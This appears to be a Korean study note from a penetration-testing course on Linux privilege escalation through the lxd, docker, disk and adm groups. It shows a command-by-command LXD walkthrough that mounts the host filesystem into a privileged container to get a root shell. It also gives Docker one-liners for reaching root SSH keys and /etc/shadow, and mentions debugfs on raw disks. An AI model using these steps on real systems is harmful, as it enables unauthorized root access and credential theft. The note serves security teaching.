## LXC/LXD
LXD는 Docker와 유사하며 Ubuntu의 컨테이너 관리자이다. 설치 시 모든 사용자가 LXD 그룹에 추가된다. LXD 컨테이너를 만들고 권한을 부여한 다음 `/mnt/root` 에서 호스트 파일 시스템에 액세스하여 권한을 확대 할 수 있다.

**lxd 그룹 확인**
```powershell
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

**Alpine 이미지 압축 풀기**
```powershell
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\\ Alpine/
```

**LXD 초기화**
```powershell
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```
(LXD 사용법 링크: [https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) )

**로컬 이미지 불러오기**
```powershell
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

**security.privileged를 true로 설정하여 privileged container 실행**
```powershell
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

**host file system 마운트**
```powershell
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

마지막으로 컨테이너 인스턴스 내부에서 셸을 생성한다. 이제 root 권한으로 마운트된 파일 시스템을 탐색할 수 있다. 예를 들어, 호스트의 루트 디렉토리 내용에 액세스하려면 `cd /mnt/root/root` 로 이동하면 된다.
```powershell
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

## Docker
사용자를 docker group에 놓는건 근본적으로 root 권한과 다르지 않다. `docker run -v /root:/mnt -it ubuntu` 는 볼륨으로 마운트된 호스트 파일 시스템의 /root 디렉토리에 새 Docker 인스턴스를 만든다. 컨테이너가 시작되면 마운트된 디렉토리를 탐색하고 root 사용자에 대한 SSH 키를 검색하거나 추가할 수 있다. 물론 /etc/shadow도 마찬가지로 가능하다.
```sh
# root 경로만 접근, .ssh 에 키를 업로드하거나 등 행위 가능
docker run -v /root:/mnt -it ubuntu
# 전 경로 접근
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Disk
disk 그룹에 있는 사용자들은 /dev/sda1과 같은 /dev의 어떠한 장치에도 full access가 가능하다. 이러한 권한이 있는 공격자는 `debugfs` 를 사용하여 전체 파일 시스템에 root 권한으로 접근이 가능하다.

## ADM
adm 그룹 사용자들은 `/var/log` 의 모든 로그를 읽을 수 있다. 직접적인 root 접근은 안되지만, 민감한 데이터를 로그파일로 얻거나 사용자 행동과 cron job을 살펴볼 수 있다.

**adm 그룹 예시**

```powershell
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```